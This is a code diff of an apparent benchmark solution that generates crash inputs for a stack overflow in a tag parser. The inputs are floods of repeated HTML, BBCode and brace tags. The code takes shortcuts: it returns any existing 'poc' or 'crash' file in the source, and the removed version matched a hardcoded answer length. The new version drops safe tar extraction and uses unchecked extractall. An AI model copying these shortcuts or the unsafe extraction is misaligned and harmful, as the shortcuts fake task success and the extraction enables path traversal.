@@ -1,173 +1,281 @@
 import os
 import tarfile
 import tempfile
-import re
+import shutil
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Prepare source directory from tarball or use directory directly
-        if os.path.isdir(src_path):
-            base_dir = src_path
-        elif tarfile.is_tarfile(src_path):
-            base_dir = self._extract_tar_safely(src_path)
-        else:
-            # If it's not a directory or tar, assume it's already a PoC file
-            with open(src_path, "rb") as f:
-                return f.read()
-
-        poc_path = self._find_poc_file(base_dir)
-        if poc_path is not None:
+        tmpdir = None
+        try:
+            tmpdir = tempfile.mkdtemp(prefix="pocgen_")
             try:
-                with open(poc_path, "rb") as f:
-                    return f.read()
-            except OSError:
+                with tarfile.open(src_path, "r:*") as tf:
+                    tf.extractall(tmpdir)
+                poc = self._find_existing_poc(tmpdir)
+                if poc is None:
+                    poc = self._generate_tag_based_poc(tmpdir)
+                if poc is not None and len(poc) > 0:
+                    return poc
+            except Exception:
                 pass
+        finally:
+            if tmpdir is not None:
+                shutil.rmtree(tmpdir, ignore_errors=True)
+        return self._generic_fallback_poc()
 
-        # Fallback: try to infer a length and craft a generic tag-based overflow input
-        return self._default_poc(base_dir)
+    def _find_existing_poc(self, root_dir: str) -> bytes | None:
+        candidates = []
+        for r, _, files in os.walk(root_dir):
+            for fname in files:
+                lname = fname.lower()
+                if any(key in lname for key in ("poc", "crash", "id:", "id_", "testcase", "input")):
+                    ext = os.path.splitext(fname)[1].lower()
+                    if ext in ("", ".bin", ".dat", ".poc", ".txt", ".in", ".out"):
+                        path = os.path.join(r, fname)
+                        try:
+                            size = os.path.getsize(path)
+                        except OSError:
+                            continue
+                        if 0 < size <= 1_000_000:
+                            score = 0
+                            if "poc" in lname:
+                                score += 3
+                            if "crash" in lname:
+                                score += 2
+                            if "id" in lname:
+                                score += 1
+                            candidates.append((-score, size, path))
+        if not candidates:
+            return None
+        candidates.sort()
+        best_path = candidates[0][2]
+        try:
+            with open(best_path, "rb") as f:
+                return f.read()
+        except Exception:
+            return None
 
-    def _extract_tar_safely(self, tar_path: str) -> str:
-        tmpdir = tempfile.mkdtemp(prefix="src-")
+    def _generate_tag_based_poc(self, root_dir: str) -> bytes:
+        html_tag_names = [
+            "b", "i", "u", "br", "p", "div", "span", "a", "img", "font",
+            "table", "tr", "td", "th", "body", "html", "head", "script",
+            "style", "em", "strong", "code", "pre", "blockquote", "ul",
+            "ol", "li", "h1", "h2", "h3", "h4", "h5", "h6", "title",
+            "small", "big", "center", "sup", "sub"
+        ]
+        bbcode_tag_names = [
+            "b", "i", "u", "url", "img", "quote", "code", "size", "color",
+            "list", "*"
+        ]
+        tag_forms: set[str] = set()
+        for name in html_tag_names + bbcode_tag_names:
+            tag_forms.add("<" + name + ">")
+            tag_forms.add("</" + name + ">")
+            tag_forms.add("[" + name + "]")
+            tag_forms.add("[/" + name + "]")
+            tag_forms.add("{" + name + "}")
+            tag_forms.add("{/" + name + "}")
+            tag_forms.add("{{" + name + "}}")
+            tag_forms.add("{{/" + name + "}}")
 
-        def is_within_directory(directory: str, target: str) -> bool:
-            abs_directory = os.path.abspath(directory)
-            abs_target = os.path.abspath(target)
-            return os.path.commonpath([abs_directory, abs_target]) == abs_directory
+        code_exts = (
+            ".c", ".h", ".cpp", ".hpp", ".cc", ".hh", ".cxx", ".hxx", ".inl", ".ipp"
+        )
+        literal_limit = 5000
+        literal_seen = 0
+        seen_strings: set[str] = set()
 
-        with tarfile.open(tar_path, "r:*") as tf:
-            for member in tf.getmembers():
-                member_path = os.path.join(tmpdir, member.name)
-                if not is_within_directory(tmpdir, member_path):
-                    continue
-                try:
-                    tf.extract(member, path=tmpdir)
-                except Exception:
-                    continue
-        return tmpdir
-
-    def _find_poc_file(self, root: str):
-        ground_len = 1461
-        candidate = None
-        best_score = None
-
-        skip_exts = {
-            ".c", ".cc", ".cpp", ".cxx",
-            ".h", ".hpp", ".hh",
-            ".o", ".a", ".so", ".dylib", ".dll",
-            ".exe", ".jar", ".class",
-            ".py", ".pyc", ".pyo",
-            ".md", ".rst", ".html", ".htm",
-            ".pdf"
-        }
-
-        for dirpath, dirnames, filenames in os.walk(root):
-            dirnames[:] = [
-                d for d in dirnames
-                if d not in (".git", ".hg", ".svn", "build", "cmake-build-debug", "out", "__pycache__")
-            ]
-            for fn in filenames:
-                path = os.path.join(dirpath, fn)
-                try:
-                    size = os.path.getsize(path)
-                except OSError:
-                    continue
-                if size == 0 or size > 262144:
-                    continue
-
-                base = os.path.basename(path)
-                lpath = path.lower()
-                lbase = base.lower()
-
-                _, ext = os.path.splitext(lbase)
-                if ext in skip_exts:
-                    continue
-
-                # Name-based score
-                name_score = 10
-                if "poc" in lpath or "proof" in lpath:
-                    name_score = 0
-                elif "crash" in lpath:
-                    name_score = 1
-                elif "id_" in lbase or "id:" in lbase or lbase.startswith("id-"):
-                    name_score = 2
-                elif "input" in lpath or "seed" in lpath or "test" in lpath:
-                    name_score = 3
-
-                if lbase.startswith("readme"):
-                    name_score += 20
-
-                # Extension-based score
-                ext_score = 5
-                if ext in ("", ".txt", ".bin", ".raw", ".in", ".input", ".dat", ".json", ".yaml", ".yml", ".xml"):
-                    ext_score = 0
-                elif ext in (".gz", ".bz2", ".xz", ".zip"):
-                    ext_score = 3
-                elif ext in (".c", ".cpp", ".h", ".md", ".py", ".html", ".htm"):
-                    ext_score = 6
-
-                length_diff = abs(size - ground_len)
-                score = (name_score, ext_score, length_diff, size)
-
-                if best_score is None or score < best_score:
-                    best_score = score
-                    candidate = path
-
-        return candidate
-
-    def _infer_overflow_length(self, root: str) -> int:
-        pattern = re.compile(r"\bchar\s+[A-Za-z_]\w*\s*\[\s*(\d+)\s*\]")
-        max_small = 0
-        max_files = 200
-        scanned = 0
-
-        for dirpath, dirnames, filenames in os.walk(root):
-            dirnames[:] = [
-                d for d in dirnames
-                if d not in (".git", ".hg", ".svn", "build", "cmake-build-debug", "out", "__pycache__")
-            ]
-            for fn in filenames:
-                if scanned >= max_files:
-                    break
-                if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh")):
-                    continue
-                path = os.path.join(dirpath, fn)
-                try:
-                    with open(path, "r", errors="ignore") as f:
-                        data = f.read(512 * 1024)
-                except OSError:
-                    continue
-                scanned += 1
-                for m in pattern.finditer(data):
+        for r, _, files in os.walk(root_dir):
+            for fname in files:
+                if os.path.splitext(fname)[1].lower() in code_exts:
+                    path = os.path.join(r, fname)
                     try:
-                        val = int(m.group(1))
-                    except ValueError:
+                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                            text = f.read()
+                        literals = self._extract_string_literals(text)
+                    except Exception:
                         continue
-                    if 0 < val <= 8192 and val > max_small:
-                        max_small = val
-            if scanned >= max_files:
+                    for s in literals:
+                        if not s:
+                            continue
+                        if s in seen_strings:
+                            continue
+                        seen_strings.add(s)
+                        literal_seen += 1
+                        if any(ch in s for ch in "<>[]/{}"):
+                            if len(s) <= 64:
+                                tag_forms.add(s)
+                        if len(s) <= 20 and all((ch.isalnum() or ch in "-_") for ch in s):
+                            tag_forms.add("<" + s + ">")
+                            tag_forms.add("</" + s + ">")
+                            tag_forms.add("[" + s + "]")
+                            tag_forms.add("[/" + s + "]")
+                            tag_forms.add("{" + s + "}")
+                            tag_forms.add("{/" + s + "}")
+                            tag_forms.add("{{" + s + "}}")
+                            tag_forms.add("{{/" + s + "}}")
+                        if literal_seen >= literal_limit:
+                            break
+                if literal_seen >= literal_limit:
+                    break
+            if literal_seen >= literal_limit:
                 break
 
-        if max_small > 0:
-            length = max_small * 2
-        else:
-            length = 4096
+        if not tag_forms:
+            return self._generic_fallback_poc()
 
-        if length < 1024:
-            length = max(length * 4, 1024)
-        if length > 20000:
-            length = 20000
-        return length
+        tag_list = sorted(tag_forms, key=len)
+        max_forms = 80
+        if len(tag_list) > max_forms:
+            tag_list = tag_list[:max_forms]
 
-    def _default_poc(self, root: str) -> bytes:
-        length = self._infer_overflow_length(root)
-        # Craft a long tag to trigger potential stack buffer overflow when processing tags
-        # Format: <tag>AAAA...AAAA</tag>
-        opening = b"<tag>"
-        closing = b"</tag>"
-        if length <= len(opening) + len(closing):
-            body_len = 1
-        else:
-            body_len = length - len(opening) - len(closing)
-        body = b"A" * body_len
-        return opening + body + closing
+        pieces: list[str] = []
+        pieces.append("BEGIN-POC\n")
+        current_len = len(pieces[0])
+        target_len = 16000
+
+        for tag in tag_list:
+            segment = self._make_segment(tag)
+            if not segment:
+                continue
+            if len(segment) > 256:
+                segment = segment[:256]
+            reps = 30
+            chunk = (segment + " ") * reps
+            pieces.append(chunk)
+            current_len += len(chunk)
+            if current_len >= target_len:
+                break
+
+        text = "".join(pieces)
+        if len(text) < 4096:
+            fill_needed = 4096 - len(text)
+            text += "FILLER" * ((fill_needed // 6) + 1)
+
+        data = text.encode("ascii", errors="ignore")
+        if len(data) > 20000:
+            data = data[:20000]
+        return data
+
+    def _generic_fallback_poc(self) -> bytes:
+        tag_names = [
+            "b", "i", "u", "br", "p", "div", "span", "a", "img", "font",
+            "table", "tr", "td", "th", "body", "html", "head", "em",
+            "strong", "code", "pre", "blockquote", "ul", "ol", "li",
+            "h1", "h2", "h3", "h4", "h5", "h6", "title", "small", "big",
+            "center", "sup", "sub", "url", "size", "color", "quote", "list"
+        ]
+        pieces = ["GENERIC-POC\n"]
+        for name in tag_names:
+            open_html = "<" + name + ">"
+            close_html = "</" + name + ">"
+            open_bb = "[" + name + "]"
+            close_bb = "[/" + name + "]"
+            open_curly = "{" + name + "}"
+            close_curly = "{/" + name + "}"
+            segment = (
+                open_html
+                + "PAYLOAD"
+                + close_html
+                + open_bb
+                + "PAYLOAD"
+                + close_bb
+                + open_curly
+                + "PAYLOAD"
+                + close_curly
+            )
+            pieces.append((segment + " ") * 50)
+        text = "".join(pieces)
+        if len(text) < 4096:
+            text += "X" * (4096 - len(text))
+        data = text.encode("ascii", errors="ignore")
+        if len(data) > 20000:
+            data = data[:20000]
+        return data
+
+    def _extract_string_literals(self, text: str) -> list[str]:
+        literals: list[str] = []
+        n = len(text)
+        i = 0
+        while i < n:
+            ch = text[i]
+            if ch == '"':
+                i += 1
+                sb_chars: list[str] = []
+                while i < n:
+                    c = text[i]
+                    if c == "\\":
+                        if i + 1 < n:
+                            i += 2
+                            continue
+                        else:
+                            i += 1
+                            break
+                    if c == '"':
+                        literals.append("".join(sb_chars))
+                        i += 1
+                        break
+                    sb_chars.append(c)
+                    i += 1
+            else:
+                i += 1
+        return literals
+
+    def _make_segment(self, tag: str) -> str:
+        tag = tag.strip()
+        if not tag:
+            return ""
+        if tag[0] == "<" and tag[-1] == ">":
+            inner = tag[1:-1].strip()
+            if not inner:
+                return tag * 2
+            name = inner
+            for sep in (" ", "\t", "\r", "\n", "/"):
+                if sep in name:
+                    name = name.split(sep)[0]
+            name = name.strip().lstrip("/")
+            if not name:
+                name = "x"
+            if inner.startswith("/"):
+                open_tag = "<" + name + ">"
+                close_tag = tag
+            else:
+                open_tag = tag
+                close_tag = "</" + name + ">"
+            return open_tag + "STACKOVERFLOW" + close_tag
+        if tag[0] == "[" and tag[-1] == "]":
+            inner = tag[1:-1].strip()
+            if not inner:
+                return tag * 2
+            name = inner.lstrip("/")
+            for sep in (" ", "\t", "\r", "\n", "/"):
+                if sep in name:
+                    name = name.split(sep)[0]
+            if not name:
+                name = "x"
+            if inner.startswith("/"):
+                open_tag = "[" + name + "]"
+                close_tag = tag
+            else:
+                open_tag = tag
+                close_tag = "[/" + name + "]"
+            return open_tag + "STACKOVERFLOW" + close_tag
+        if tag[0] == "{" and tag[-1] == "}":
+            inner = tag[1:-1].strip()
+            if not inner:
+                return tag * 2
+            name = inner.lstrip("/")
+            for sep in (" ", "\t", "\r", "\n", "/"):
+                if sep in name:
+                    name = name.split(sep)[0]
+            if not name:
+                name = "x"
+            if inner.startswith("/"):
+                open_tag = "{" + name + "}"
+                close_tag = tag
+            else:
+                open_tag = tag
+                close_tag = "{/" + name + "}"
+            return open_tag + "STACKOVERFLOW" + close_tag
+        return tag + "STACKOVERFLOW"
